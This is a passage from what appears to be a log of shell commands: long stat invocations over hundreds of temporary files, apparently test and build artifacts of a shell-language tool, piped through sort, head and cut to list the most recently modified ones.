/tmp/xcxxvyyo /tmp/xczielnu /tmp/xdflctij /tmp/xdmlmhqo /tmp/xdroryji_grep_8_seq.ir /tmp/xdwdcvwh /tmp/xdzpuduy /tmp/xdzymdag /tmp/xecbrwmt_spell_8_seq.ir /tmp/xecufwdx /tmp/xedsmtjr /tmp/xelvmrhc /tmp/xesteixa /tmp/xesywgqf /tmp/xffdfyrf /tmp/xfinfbvx /tmp/xfkhiynd /tmp/xfnaevaw /tmp/xfukcimr /tmp/xfzoqeis /tmp/xgaydhlh /tmp/xggfhwnn /tmp/xggkcbgl /tmp/xghbwvsd_semantics.tilde.quoted.ir /tmp/xgihysgv_show_ifs.ir /tmp/xgiigqxh /tmp/xgjwwlvl /tmp/xgktfdka /tmp/xglvewsq /tmp/xgqjauhh /tmp/xgqxnndb /tmp/xgxpezzr /tmp/xhaqdcjq /tmp/xhfuixjs /tmp/xhhevmos /tmp/xhjavqie /tmp/xhkbtvlc /tmp/xhkhvdqx /tmp/xhmvebco /tmp/xhokctna_showpid.ir /tmp/xhunkphx /tmp/xhwdpolu /tmp/xhzppleu /tmp/ximakiwk /tmp/ximpsjsf /tmp/xiuvaupq_minimal_sort_8_seq.ir /tmp/xiziixup /tmp/xjaeavgx /tmp/xjaylidf /tmp/xjazmfdd /tmp/xjevznsc /tmp/xjgbnlhf /tmp/xjgrvjiq /tmp/xjguixqa /tmp/xjljlfbm /tmp/xjqrktot /tmp/xjypoozn /tmp/xkcgylko /tmp/xkckujfy /tmp/xkdacssj /tmp/xkgqhniz_double_sort_2_seq.ir /tmp/xkhziejq /tmp/xkisfttg /tmp/xkjwnvgs /tmp/xklmwsmt_builtin.exec.true.ir /tmp/xkoqalsi /tmp/xkqrqjrx /tmp/xlasadls /tmp/xlbxmouv /tmp/xleecqho /tmp/xlfllwos /tmp/xlhkdptq /tmp/xlhwhpbi /tmp/xlingehr /tmp/xlknuyxq /tmp/xlxovmni /tmp/xmbgtxkw /tmp/xmlhfzdz /tmp/xmlmdnux /tmp/xmlosgcv /tmp/xmougazh /tmp/xmxrmexl /tmp/xndzxrve /tmp/xnezkqpt /tmp/xnhjiklc /tmp/xnimbaac /tmp/xnkhkqir /tmp/xnngqnfu /tmp/xnqmquii /tmp/xnrksrwl /tmp/xnrlzwxb /tmp/xnstrfni /tmp/xnwnkozl /tmp/xoexxxza /tmp/xofafgyj /tmp/xohzddsj /tmp/xopknpid /tmp/xoqincdu /tmp/xorxqeoi /tmp/xoticmuf_builtin.trap.subshell.quiet.ir /tmp/xowkyyff /tmp/xoybtbip /tmp/xpbchjlz /tmp/xpddlgzb /tmp/xphktknv /tmp/xpjwjcmj /tmp/xplefwmj /tmp/xpncrtic /tmp/xppwyavz /tmp/xprgtofs /tmp/xprkrche /tmp/xpsfvrhn /tmp/xptzwkil /tmp/xqbwbhaj /tmp/xqcgrebc /tmp/xqctfcov /tmp/xqjhaqvv /tmp/xqjkjkwc /tmp/xqnbzher /tmp/xqnpbkmg /tmp/xqobifyu /tmp/xqofurkn /tmp/xqpiropd /tmp/xqvleydo /tmp/xrdetbkg /tmp/xrfuwgfb /tmp/xrikuosr /tmp/xrorypak /tmp/xrouvbrj /tmp/xrqnosur_semantics.background.pipe.pid.ir /tmp/xrqyceie /tmp/xrsqenro /tmp/xrvwigjs /tmp/xrznrbfg /tmp/xsaixocy /tmp/xsdxyvcl /tmp/xsmmlksj /tmp/xsncwpbr /tmp/xsnxuejw /tmp/xstuvzxw /tmp/xtapjmjs /tmp/xtdovovp /tmp/xtdxkiho /tmp/xtgbjmsp /tmp/xtgzfmmm /tmp/xtikftio_double_sort_8_seq.ir /tmp/xtnhvbjm /tmp/xtnscgrw /tmp/xtolqkii /tmp/xtrvlkkz /tmp/xubepubt /tmp/xubtqfdv /tmp/xufdymfc /tmp/xuhpthct /tmp/xulwruqp /tmp/xumvxpmd /tmp/xutbmlgm /tmp/xuwiaggj /tmp/xuxfodod /tmp/xvhwkopf /tmp/xvjsaghj /tmp/xvlesqmf /tmp/xvlkvine /tmp/xvvwpfsf /tmp/xvwzqarz /tmp/xvxoefzz /tmp/xvyxdxbq /tmp/xwbvjywj /tmp/xwdrvqwg /tmp/xwfirbmn /tmp/xwoqxuli /tmp/xwpjivdj /tmp/xwtrdktn /tmp/xwvdjcbe /tmp/xwvuequy /tmp/xxgnaqyh /tmp/xxjktyea /tmp/xxxkyxqt /tmp/xygcbvqb /tmp/xyjljurb /tmp/xypksczh_semantics.kill.traps.ir /tmp/xyrnyrpf /tmp/xyxeyhok /tmp/xzfndkld /tmp/xzfnxlxc_builtin.pwd.exitcode.ir /tmp/xzggzeia /tmp/xzhvirgx /tmp/xzifrcqx /tmp/xzkdtuph /tmp/xzmxbpjd /tmp/xznusaor_double_sort_2_seq.ir /tmp/xzsbzrtn /tmp/xzserhvw /tmp/xztbdolr /tmp/xztsqdig /tmp/xzwbxyod_shortest_scripts_2_seq.ir /tmp/yaahfpzb /tmp/yabexsix /tmp/yaetawhx /tmp/yarduwln /tmp/yaueydpo /tmp/yavbndsn /tmp/ybgkxzfv /tmp/ybhtixxk /tmp/ybjearlc /tmp/ybmusopa /tmp/ybudpbec /tmp/ybxuqfdo /tmp/yckbyddb /tmp/yckqrxoi /tmp/ycmiezzl_semantics.pattern.bracket.quoted.ir /tmp/ycntelip /tmp/ycoluhrp /tmp/ycowexoy /tmp/ycpbxaaw /tmp/ydbannad /tmp/yddhqiji /tmp/ydfethbc /tmp/ydfkuqac /tmp/ydfzkwuk /tmp/ydhougpl /tmp/ydimlwvi /tmp/ydlabgyz /tmp/ydlilzui /tmp/ydmkyatm /tmp/ydnapmyo /tmp/ydtraiiv /tmp/ydxzvdhp /tmp/ydzefgag /tmp/yebqfrjw /tmp/yecppwck /tmp/yejgwnwf_scr1.ir /tmp/yejpcfyq /tmp/yelgdfvt /tmp/yemkqlgq /tmp/yexzawhe /tmp/yezltqii /tmp/yfdtxoyi /tmp/yfeypdsc /tmp/yffqtlww /tmp/yfglpnqj_minimal_grep_8_seq.ir /tmp/yflpbhuu /tmp/yfotlblo /tmp/yfwvtpzv /tmp/yfxgfsvw /tmp/ygaqtxzs /tmp/yggmxrbj /tmp/yghbpvpg_semantics.var.alt.nullifs.ir /tmp/ygimnhqc /tmp/ygirkjyg /tmp/ygmqfynp /tmp/ygoazxfu_micro_1000_8_seq.ir /tmp/ygsbfbfu /tmp/ygtmgerr /tmp/ygtpnonx /tmp/ygvhznjc /tmp/yhajlwvf /tmp/yhakkbbm /tmp/yhblfgci /tmp/yhforoqn /tmp/yhlsrfoc /tmp/yhntpyhf_builtin.exec.badredir.ir /tmp/yhsdfmnl /tmp/yhsiajmn /tmp/yhssadnf /tmp/yhsxfmbm /tmp/yhtbferr /tmp/yhtcdqip /tmp/yhtjnohm_comm-par-test_8_seq.ir /tmp/yhwzojrv /tmp/yihevpbu_deadlock_test_8_seq.ir /tmp/yimyzael /tmp/yinagnom /tmp/yjawmewh /tmp/yjienfzi /tmp/yjmeafdl /tmp/yjpuorzv /tmp/yjrnxrmq_semantics.tilde.ir /tmp/yjvcxlah /tmp/ykfbhzvi /tmp/ykktltbu /tmp/ykoeghiw /tmp/ykpjzaks /tmp/ykqemfqj /tmp/ykscvpii /tmp/ykxrkhxy /tmp/ykziozvn /tmp/ylextval /tmp/ylsjkdas /tmp/ylwjvvct /tmp/ymaynykz /tmp/ymbggmof /tmp/ymcjfxxg /tmp/ymfjwrbe /tmp/ymfpcgaq /tmp/ymkezlju /tmp/ymlylfal /tmp/ymmajsuq /tmp/ymvdvnfs /tmp/ymvlngxm /tmp/ymvyyjjj /tmp/yndaaffw /tmp/ynlxwntb /tmp/ynrcwhci /tmp/ynrlryxn /tmp/yntyrhkr /tmp/ynyfekpw /tmp/ynyytgwi /tmp/ynzrgrje /tmp/yodkarlx /tmp/yoglezno /tmp/yogskskx /tmp/yohjygrv /tmp/yoltykjc /tmp/yonlikai /tmp/yovjpocq /tmp/yoxhyfda /tmp/ypfluewq /tmp/ypgscwog /tmp/yplwbsel /tmp/ypoqtvua /tmp/yppfatvm /tmp/ypyzrpxj /tmp/ypzodfme /tmp/yqbsilrg /tmp/yqkmhbed /tmp/yqldcrvo /tmp/yqnzszax /tmp/yraooszk /tmp/yrevftgo /tmp/yrhscuiu /tmp/yrldadbf /tmp/yrojexsd /tmp/yrrmljxp_set-diff_2_seq.ir /tmp/yrtgdxyy /tmp/yrukvdut /tmp/yrxtfmkl /tmp/yrzwhftm /tmp/ysbhhmsm /tmp/ysbnoyrt_hello-world.ir /tmp/ysdbwoou /tmp/ysoxerpd /tmp/ysqmxkwg /tmp/yssrsuui /tmp/ystvtbfe /tmp/ystwwzqw /tmp/ysxxjbci /tmp/ytbqhkls /tmp/ytfzubws /tmp/ythfhmfk /tmp/ytizhntl /tmp/ytnhbrsx /tmp/yttuteib /tmp/ytwxztiw_builtin.break.lexical.ir /tmp/ytxolgvy /tmp/ytzfltsb /tmp/yubdcffc /tmp/yufblpji /tmp/yugbsldl /tmp/yugzqmrr /tmp/yujaxoxv /tmp/yujwtstu /tmp/yuoddbqz /tmp/yurisiiw /tmp/yuvaiawm /tmp/yuxitajr /tmp/yvdgqyxz /tmp/yvdwgrbq /tmp/yvhwnjep /tmp/yvmxyrca /tmp/yvrcqtkh /tmp/yvrkrczb /tmp/yvsreezo /tmp/ywcqdkon /tmp/ywdouukp /tmp/ywgogltj /tmp/ywhxcypo /tmp/ywnpkpna /tmp/ywooukfk /tmp/ywqodcdd /tmp/ywyfsltm /tmp/yxcblkpg /tmp/yxfllvje /tmp/yxhltiuq /tmp/yxsmacny /tmp/yxuvizcp /tmp/yxwemhsf /tmp/yybyrjfk /tmp/yyevunio /tmp/yyhyjtov /tmp/yyiruspa /tmp/yynimsqi /tmp/yysebgwg /tmp/yyyewfry /tmp/yzkegbgf /tmp/yzknkwnw /tmp/yzohjkfb /tmp/yzootluj /tmp/yzpbufgh /tmp/yzrtjejt /tmp/yzsdeksl /tmp/zabpfuzl /tmp/zadyleka /tmp/zaforrrr /tmp/zairfnbu /tmp/zaivldcf /tmp/zarmkwwb /tmp/zaukxytl /tmp/zaxglnfl /tmp/zayzuadp /tmp/zbdajsdi /tmp/zbhbxluz /tmp/zbjalxwo /tmp/zbjkawlk /tmp/zbolviid /tmp/zbpbnwnk /tmp/zbqshwox /tmp/zburzrob /tmp/zbvbrccr /tmp/zchffxht /tmp/zchfuyai /tmp/zcoaqloh /tmp/zcrnxtwi /tmp/zctifpfj /tmp/zdcblgnl /tmp/zdftoevs /tmp/zdgetdop /tmp/zdhnvznl /tmp/zdmelrux /tmp/zdmrehwm /tmp/zdodusuw /tmp/zdtfvavs /tmp/zecyldjy /tmp/zegslqww /tmp/zehiuvvn /tmp/zeofnclq /tmp/zeoqjzfa /tmp/zeqyunzr /tmp/zeytrfws_minimal_sort_8_seq.ir /tmp/zfdspzjz /tmp/zffeewxj /tmp/zfhiybdv /tmp/zfrgamvx /tmp/zftyccih /tmp/zfvvkwns /tmp/zfzrqbcs /tmp/zgatqylx /tmp/zgawdkuq_diff_2_seq.ir /tmp/zgbtvrib /tmp/zghcbjsp_builtin.unset.ir /tmp/zgizzkvz /tmp/zgkcsbtb /tmp/zglnfjlv /tmp/zgoivkyc /tmp/zgxtcyrd /tmp/zgybbiki /tmp/zhnnjfoh /tmp/zhrwodus /tmp/zhzkwzeh /tmp/ziajctdo /tmp/zidlphwt /tmp/zidnwohb /tmp/zidqktyq /tmp/zietexal /tmp/zifpjebc /tmp/zigezrue /tmp/zihrjevp /tmp/zikswdlk /tmp/zikwemmc /tmp/zioqhjyd /tmp/zitgrvok /tmp/zizcltem /tmp/zjamwpfy /tmp/zjbvrpmo /tmp/zjdzbvhj /tmp/zjfjvjfo_semantics.expansion.quotes.adjacent.ir /tmp/zjftbvhz /tmp/zjjitwby /tmp/zjkwcufz /tmp/zjmcursi /tmp/zjmstptp /tmp/zjvthhju /tmp/zjyllhcj /tmp/zkgremgj /tmp/zkopfivt /tmp/zktvlgwk /tmp/zkvxfdus /tmp/zllhkpjk /tmp/zlmnxjqv /tmp/zlzcbfgj /tmp/zmcurnwn /tmp/zmfnunda /tmp/zmiefuqz_semantics.expansion.heredoc.backslash.ir /tmp/zmuqojrv /tmp/znbdaojo /tmp/znfnnxww /tmp/znftwgvv /tmp/zniiktee /tmp/znjuojfv /tmp/znkqpuic /tmp/znmbcnep_comm-par-test2_8_seq.ir /tmp/znmvuuri /tmp/znofhepq /tmp/znokfdej /tmp/znphivqy /tmp/znvqagro /tmp/zoahyuuq /tmp/zobkjlfr /tmp/zobztudz /tmp/zofobvqp /tmp/zohtmbiu /tmp/zonxazns /tmp/zoqetkda /tmp/zorjcxsr /tmp/zpbfhyng /tmp/zpcxwjor /tmp/zpdffsds /tmp/zpdgcazs /tmp/zphkcjvh /tmp/zpkefwqn /tmp/zprtyiii /tmp/zpskzwjt /tmp/zqafdnue_semantics.evalorder.fun.ir /tmp/zqchjuvo /tmp/zqeejhyl /tmp/zqiwpkgt /tmp/zqjxbiys /tmp/zragmuzq /tmp/zrawgbvk /tmp/zrdubtok /tmp/zrejrrbk /tmp/zrgsmpej /tmp/zrrhoqok /tmp/zrtswhrp /tmp/zsfomuyp /tmp/zskgxhfw /tmp/zspsndzn /tmp/zsxwggql /tmp/zsyvquva /tmp/zsyymzuw /tmp/ztbsbdmw /tmp/ztgvyfuj /tmp/ztgxnxuu_semantics.ifs.combine.ws.ir /tmp/ztjmdiws /tmp/ztrounwk /tmp/zttzdqky /tmp/ztvhjxjz /tmp/ztvkphwa /tmp/zufcrbbq /tmp/zuifpmml /tmp/zukgiupj /tmp/zuymodzu /tmp/zuzfwpte /tmp/zvdvexmb_semantics.for.readonly.ir /tmp/zvexpnko /tmp/zvgmxhnu /tmp/zvjtbfym /tmp/zvljvosk /tmp/zvmruhva /tmp/zvqhcovf /tmp/zvrvqjgi /tmp/zvsfskub /tmp/zvsnrpli /tmp/zvtujuag /tmp/zvvbgmso /tmp/zvvuwfmq /tmp/zwcfczky /tmp/zwfethxl /tmp/zwfntcqm /tmp/zwioqlzn /tmp/zwmfcwkq /tmp/zwraljsa /tmp/zwtfeqjr /tmp/zxcovtwc /tmp/zxhlzwrt /tmp/zxhqjaie /tmp/zxmtgrsd /tmp/zxqnvuqn /tmp/zxrkswnz /tmp/zxubatff /tmp/zxyiabtv /tmp/zyazmnak /tmp/zybkpbyh /tmp/zydqkwrt /tmp/zyhfmsgk /tmp/zyljonlr /tmp/zyngxsek /tmp/zyvpvenf /tmp/zywwnogb /tmp/zyykraqz /tmp/zyzxbbjp /tmp/zzfbjnre /tmp/zzngcnna /tmp/zzpiggre /tmp/zzpkyvvw /tmp/zzrufsdp /tmp/zzxfvwoj /tmp/zzxsttyc /tmp/zzymtbjd /tmp/zzytlmpu /tmp/zzzooswl | sort -rn | head -30 | cut -f2- 2>/dev/null"
"stat -f ""%m%t%Sm %N"" /tmp/__shutdown.log /tmp/aacfoser /tmp/aafmweza /tmp/aagufnog /tmp/aaizcrxv /tmp/aascfjzo /tmp/aatfodmi_deadlock_test_8_seq.ir /tmp/aatrgfij /tmp/aaukbfsv /tmp/aaxztyok /tmp/aayiejvq /tmp/aayiijyc /tmp/aazkftwt_semantics.var.alt.null.ir /tmp/abc /tmp/abgyavuv /tmp/ablilblp /tmp/abnvusth /tmp/abpfnvyf /tmp/absqzefu /tmp/acdgfwfh /tmp/acexihul /tmp/achkfuvq /tmp/achknolg /tmp/acmxvtes /tmp/acoaxtkc /tmp/acujzgpv /tmp/acwzmiws /tmp/acyxyivi /tmp/adasjokt /tmp/adaxljzq /tmp/adewisqu /tmp/adjhqsuq /tmp/adkppbvl /tmp/adswuesi_deadlock_test_8_seq.ir /tmp/advjsaxu /tmp/adziwiwj /tmp/aebbljjg /tmp/aefxenht /tmp/aerjjdeb /tmp/afbudkxy /tmp/afejyrkn /tmp/affvtxdy /tmp/afgtnuwg /tmp/afgvdmal /tmp/afkvsksf /tmp/afnzgmno_hello-world.ir /tmp/afobmhuu /tmp/afwaulhe /tmp/agalplhf /tmp/agbmnwiu /tmp/aghxxjbe /tmp/agmfsaxl /tmp/agpayaxu /tmp/agxwttpq /tmp/agxxqhgy /tmp/ahajbote /tmp/ahdaxqgo /tmp/ahdyrfby_minimal_grep_2_seq.ir /tmp/ahdzyixg /tmp/ahfxzlfk /tmp/ahigbcpf /tmp/ahirscew /tmp/ahiydsrb /tmp/ahrtsvsh /tmp/ahsrjaww_scr.ir /tmp/aidurbpx /tmp/aiezhcwo_semantics.tilde.colon.ir /tmp/aifqksln_builtin.eval.break.ir /tmp/aigiysan /tmp/aijjxbba /tmp/aipvrshx /tmp/aisgxprz /tmp/aixmmhyx /tmp/aiyjuasd /tmp/ajcstxpz_bigrams_2_seq.ir /tmp/ajfvcamv /tmp/ajiimvzc /tmp/ajlesrpe /tmp/ajqbxyhn /tmp/ajqjwtfi /tmp/ajrmynev /tmp/ajvcqgel /tmp/akbqtblk /tmp/akbyegpp /tmp/akdlayzn /tmp/akibfutn_builtin.dot.unreadable.ir /tmp/akkvgavn /tmp/aksujddl /tmp/akulvggx /tmp/albmtogb /tmp/alcvrjwy /tmp/alheempw /tmp/aliewevg /tmp/allhqxax /tmp/alnrrhlt /tmp/alxomfyl /tmp/alxrziou /tmp/alyyjair /tmp/amdskcuh /tmp/amfzyeiz /tmp/amgcjczr /tmp/amgokwxa /tmp/amhkobyx_minimal_grep_2_seq.ir /tmp/amkgbtca /tmp/amlwcusp /tmp/amrinhpx /tmp/amrngcnz /tmp/amzxhqwr /tmp/anfpmfdm /tmp/anwkhrjy /tmp/anztslyh /tmp/anzzjwhv /tmp/aoevmyqw /tmp/aogmgdvl_comm-par-test_2_seq.ir /tmp/aolxlvet /tmp/aoszaquu /tmp/aovjfbpu /tmp/aowzjptv /tmp/aoxbdhhi /tmp/apctuyjm /tmp/apdjxcot /tmp/apmzayck /tmp/apnqczev /tmp/aptjuxal /tmp/apwdgjdz /tmp/aqagjyxv /tmp/aqagulhs /tmp/aqdwsocg /tmp/aqehezsr /tmp/aqhtnads /tmp/aqiggdie /tmp/aqkindai /tmp/aqqmjkjj /tmp/aqseckgv /tmp/aqsyehnk /tmp/aqtntnyu /tmp/aqvmnvrm /tmp/aqzloygl /tmp/arhbjwuj /tmp/arippwea /tmp/arjoqxup /tmp/arkdqzbn /tmp/armmnskk /tmp/arqhwcev /tmp/artjirrx /tmp/arupgsdy /tmp/arvbrvwm /tmp/arwfuinc /tmp/arylexfe /tmp/arywjdlc /tmp/arzhlvsk /tmp/asafpxqj /tmp/asboouqt /tmp/asdtnyna /tmp/asgdcgbh /tmp/aslgmgrw /tmp/asnrwgla /tmp/aspukdxz /tmp/asqyqfpn /tmp/asrryvvi /tmp/asubinub /tmp/asvkoofs /tmp/asypuxqd /tmp/atdfcrbc /tmp/atlgjjyw /tmp/atmakpxr /tmp/atzjjonu /tmp/auabbywk_set-diff_2_seq.ir /tmp/aubuvdwb /tmp/aucynduu /tmp/aufpnefe /tmp/augqecgx /tmp/aujprbim /tmp/aulbhsan /tmp/auotztgt /tmp/aupugsth_builtin.set.-m.ir /tmp/austycrg /tmp/auyopgfr /tmp/auyxnutz /tmp/avlkoonl /tmp/avllpbhk /tmp/avmgnnwv /tmp/avmgtrtr /tmp/avpevigp /tmp/avpjszdw /tmp/avrnheyt /tmp/avvikphb /tmp/avzjidzv /tmp/awaefqun /tmp/awdsftce /tmp/awesyczg_hello-world.ir /tmp/awgisatq /tmp/awgvnmnp /tmp/awjqnyaf_diff_8_seq.ir /tmp/awnwmnau /tmp/awuvbfzh /tmp/axgjcdvo /tmp/axhdpdqw /tmp/axhrhrkj /tmp/axiexvhq /tmp/axujjagg /tmp/axulkzqx /tmp/aybyndjh /tmp/aygazlsw /tmp/ayksqrus /tmp/aymywmbd /tmp/ayowajjv /tmp/azecdllo /tmp/azeowpee /tmp/azkbxacn /tmp/azquyexq /tmp/azvruvua /tmp/azzillhr /tmp/baawyuwk /tmp/baewkrev /tmp/bagmttmp /tmp/baiiixtc /tmp/baqdwhfs /tmp/bargnovb /tmp/bauoyfkh /tmp/bbdqaojy /tmp/bbtxyiqj /tmp/bbuytlvl /tmp/bbwklkir /tmp/bbzhizuk /tmp/bbzjtloo /tmp/bcakoazc /tmp/bcbzqyjp /tmp/bcfmbxaf /tmp/bcjprwgb /tmp/bclyuvvj /tmp/bcmechwf /tmp/bcqmprcs /tmp/bcqpgcdx /tmp/bcsswfba /tmp/bcwyjirl /tmp/bcxudbav /tmp/bczlvwta /tmp/bdhgbzwd /tmp/bdinlgwd_scr.ir /tmp/bdjoxadc /tmp/bdldmplm_semantics.backtick.exit.ir /tmp/bdnhrxst /tmp/bdnlnmfi /tmp/bdohsivx /tmp/bdppxwap /tmp/bdrbjmul_semantics.noninteractive.expansion.exit.ir /tmp/bdsrmdre /tmp/bdzmirlf /tmp/beextocf /tmp/beghyxas /tmp/begxcref /tmp/beiufxyj /tmp/bemaouaj /tmp/bepkfvmi_builtin.export.unset.ir /tmp/bernrnkn /tmp/besekqma /tmp/beueubqx_hello-world.ir /tmp/bfcdtcbz /tmp/bfhnkzjn /tmp/bflyecvk /tmp/bfpgfkcx /tmp/bfqjvziv /tmp/bfvpyrbl /tmp/bfzzqrig /tmp/bgwredqd /tmp/bgxeqqqg /tmp/bgzlnbwy /tmp/bhdadqja /tmp/bhddmyoz /tmp/bhezvcgz /tmp/bhixmujq /tmp/bhjnbyiv /tmp/bhmhtzzg /tmp/bhnilxtz /tmp/bhpbzrdi /tmp/bifrltzx /tmp/bihbvwru /tmp/biicxgps /tmp/biippfyw /tmp/bikrqvvq /tmp/biptwzkj /tmp/bitvtcsw /tmp/biuiqgii /tmp/biyzbcqy /tmp/bjcdjgba /tmp/bjfuhjfq /tmp/bjlxcbdg /tmp/bjnpilhl /tmp/bjopcgdk /tmp/bjosdddu /tmp/bjotfosb /tmp/bjrxzsfz /tmp/bjukypjr /tmp/bjxqpyqo /tmp/bjzeloqi /tmp/bkahomrr /tmp/bkctufgu /tmp/bkfhikeh /tmp/bkfldssy /tmp/bkipciib /tmp/bkkoxpcx /tmp/bkmdecuu /tmp/bkqmamww /tmp/bkrskspz /tmp/bktgaklz /tmp/bkvbxgxj /tmp/blayxlvx /tmp/bldwxrbc /tmp/blemoxyw /tmp/blgmkxsr /tmp/blionkio /tmp/blmukjid /tmp/blurtcwx_semantics.splitting.ifs.ir /tmp/blxabatt /tmp/bmluzwae /tmp/bmnqhoup /tmp/bmsugpbl /tmp/bmulrrzu /tmp/bmzpbrnw_semantics.-C.ir /tmp/bmzplxvq /tmp/bngbfxgm /tmp/bngjjbck /tmp/bnhejsta /tmp/bnmcdrjd /tmp/bnruuyit /tmp/boerxyzm /tmp/boeyancz /tmp/bokhjrde /tmp/bolsxxuv /tmp/boofmkaq_semantics.fun.error.restore.ir /tmp/bopxjzug /tmp/bosscokz /tmp/bowcjcjc /tmp/bpdbhstk /tmp/bpjpwsle /tmp/bpkkipti /tmp/bpkntvpt /tmp/bppokmfn /tmp/bpsixhtb /tmp/bpyqyqpd /tmp/bqndhkcf /tmp/bqocktsb /tmp/braqegzo_bigrams_8_seq.ir /tmp/brdryraz /tmp/brdxpiox /tmp/brkjqeiz /tmp/brnmmoxv /tmp/bruqeqne /tmp/bsatshhx /tmp/bscfdqmp /tmp/bscsaluv /tmp/bsdoebwa /tmp/bsecjltt /tmp/bsethlwt /tmp/bsftiorw /tmp/bsjgzsam /tmp/bsjjpnxw /tmp/bslveohk /tmp/bsmeonwm /tmp/bsrhqhjm /tmp/bsubhadb /tmp/bswvahju /tmp/bsyptwug /tmp/btguztum /tmp/bthhkxkb /tmp/btioxgom /tmp/btkvyjey_semantics.command-subst.ir /tmp/btmtwaix /tmp/btnnyiro_semantics.subshell.redirect.ir /tmp/btpnvkmm /tmp/btsthdat /tmp/bttdqdvz /tmp/bttyqdws_scr.ir /tmp/bucitmwo /tmp/buhnbklf /tmp/buiyappz /tmp/bumjyfvc /tmp/buvwnbqy /tmp/buzyseap /tmp/bvaikdwj /tmp/bveqbdmv /tmp/bvhhxgne_topn_2_seq.ir /tmp/bvjthgnt /tmp/bvkhwvpn /tmp/bvmvkzoe /tmp/bvwjdcnn /tmp/bvwjptia /tmp/bvxvdxja /tmp/bwcmghqt /tmp/bwdpaogo /tmp/bwenlbum /tmp/bwqxutps /tmp/bwtwhbhv /tmp/bwvzlvbc /tmp/bxjxrksr /tmp/bxjyrjgk /tmp/bxlojydc /tmp/bxonfvjr /tmp/bxsqnpqf /tmp/bxvpltou_export_var_script_8_seq.ir /tmp/bxwnepmk /tmp/byasoyfo /tmp/bydflnca /tmp/byewnbmq /tmp/byhcxjrm_minimal_grep_stdin_8_seq.ir /tmp/byrkycas /tmp/byrsbsvh_double_sort_2_seq.ir /tmp/bzdzhhsk /tmp/bzjyqais /tmp/bznizfsw /tmp/bzumdzpv_comm-par-test2_2_seq.ir /tmp/bzuxfqgb /tmp/bzyqnpkk /tmp/caavieaq /tmp/caczlwsf_builtin.special.redir.error.ir /tmp/cahglpsw /tmp/caijufiz /tmp/catdbnix /tmp/catvshhl /tmp/cauiqtgi /tmp/cavrjvym_alt_bigrams_2_seq.ir /tmp/cayyiqzg /tmp/cbauwkfz /tmp/cbpfigsz /tmp/cbrxobau /tmp/cbstemvy /tmp/cbtvjstz_comm-par-test_8_seq.ir /tmp/cbwtkgeg /tmp/cbysvuog /tmp/cbzdkilo /tmp/ccboqvin /tmp/ccfrurlh /tmp/cchgopdk /tmp/ccjoqdkg /tmp/ccjytuzh /tmp/cckgzkdi /tmp/ccloumuz /tmp/cdbgxank /tmp/cdhbgger /tmp/cdjtoxmu /tmp/ceaqcfpq /tmp/cefsaupo /tmp/cejbmfhi /tmp/cekziipe /tmp/celgdsbb /tmp/celuzdxh /tmp/celvffso /tmp/cenpihcm /tmp/ceotevyk /tmp/ceqlekyb /tmp/cewahwlv /tmp/cezrdwqd /tmp/cfbpjwoq /tmp/cfdtsoie /tmp/cfiaratq /tmp/cfwjehlw /tmp/cfwsbhyy /tmp/cfwuzsyn_comm-par-test2_8_seq.ir /tmp/cfxcfhci /tmp/cgczanow /tmp/cgjttlvf /tmp/cgoizblw /tmp/cgzegzjl /tmp/chfwsmev /tmp/chlyzzts /tmp/chncmsen /tmp/chqjcirb_comm-par-test2_2_seq.ir /tmp/chswxnfx /tmp/chycfziu /tmp/chyepwsh /tmp/chywtykn /tmp/chyybcza /tmp/cidhhyoe /tmp/cidtzxuu /tmp/cietprgv /tmp/cifavqat /tmp/cifrqsyl /tmp/cigisjqp /tmp/cigwvsiy /tmp/ciiivmpu /tmp/cijpcuyr /tmp/cisufufw /tmp/ciubnxlr /tmp/civsbhyh /tmp/ciwbgizg /tmp/ciwjvkdi /tmp/cixmcnby /tmp/cjbftxqd /tmp/cjgduluj /tmp/cjgjpzns /tmp/cjhfynbg /tmp/cjozmosv /tmp/cjqemsix /tmp/cjqplsea /tmp/cjroxawb /tmp/cjusdadq /tmp/cjuurkxs /tmp/ckdrjylh /tmp/ckeujemo /tmp/ckooyxze /tmp/ckrobszn /tmp/ckygiiie_grep_2_seq.ir /tmp/cleudpyw /tmp/clfcfahh /tmp/clgfuxlh /tmp/clqgzwcw /tmp/clrufwtu /tmp/clrxnlze_builtin.source.nonexistent.ir /tmp/cltuavfu /tmp/clyqokgl /tmp/cmorbywk /tmp/cmwuqthb /tmp/cndexjom /tmp/cnmpksra /tmp/coetxyps /tmp/colfsmbc /tmp/coluvhqg /tmp/coprtvdg /tmp/cosndoqq /tmp/coukpraj /tmp/covubvph /tmp/cpan_install_0nvM.txt /tmp/cpan_install_7nbd.txt /tmp/cpan_install_7rMb.txt /tmp/cpan_install_KIaQ.txt /tmp/cpan_install_UTmY.txt /tmp/cpan_install_aCXD.txt /tmp/cpan_install_foyI.txt /tmp/cpan_install_i_a7.txt /tmp/cpan_install_kPt1.txt /tmp/cpan_install_mMEt.txt /tmp/cpan_install_oVz4.txt /tmp/cpan_install_pZz4.txt /tmp/cpan_install_ujxZ.txt /tmp/cpan_install_yn0t.txt /tmp/cpfvaysx_minimal_grep_2_seq.ir /tmp/cpgjchey /tmp/cpkfzdhm /tmp/cpqfkhic /tmp/cpqxhwft /tmp/cpvaotgp_set-diff_2_seq.ir /tmp/cpwtueuz /tmp/cqedaule /tmp/cqgnprlv /tmp/cqjgzzkl /tmp/cqlxogzu /tmp/cqowfvmh /tmp/cqsoykrq /tmp/cquqnfdy /tmp/crchzzeh /tmp/crdslghh /tmp/crixeamr /tmp/crufkntz /tmp/cscjhfgp /tmp/csgdovgo /tmp/csirobrj /tmp/cslpcezp /tmp/csuxgcxn /tmp/csuyxiue /tmp/cszkhdae /tmp/ctctsary /tmp/ctcwxqgs_wf_2_seq.ir /tmp/ctqpmtdp /tmp/ctqzdgvb /tmp/ctxnfsbp /tmp/ctypes_libffi9d213b.cmi /tmp/ctypes_libffi9d213b.cmo /tmp/ctypes_libffi9d213b.ml /tmp/ctypes_libffidbdc71.c /tmp/ctzfqclg /tmp/cudpsgzf /tmp/cufbavot /tmp/cufedxdx /tmp/cuivuhxs /tmp/cujarwgk /tmp/cujhguwx /tmp/cuoosjar /tmp/cuoxyoam /tmp/cursqbeg /tmp/cvadnjir /tmp/cvajjqgf /tmp/cvffdkov /tmp/cvirpbsw /tmp/cvnqzjyz /tmp/cvxskxga /tmp/cwbzokkh /tmp/cwjeubqf_semantics.var.unset.nofield.ir /tmp/cwjlwbhv /tmp/cwjsnpbj /tmp/cwlebpxz_test_script.ir /tmp/cwshddsw /tmp/cwslpvtv /tmp/cxcqokqx /tmp/cxedhvuk 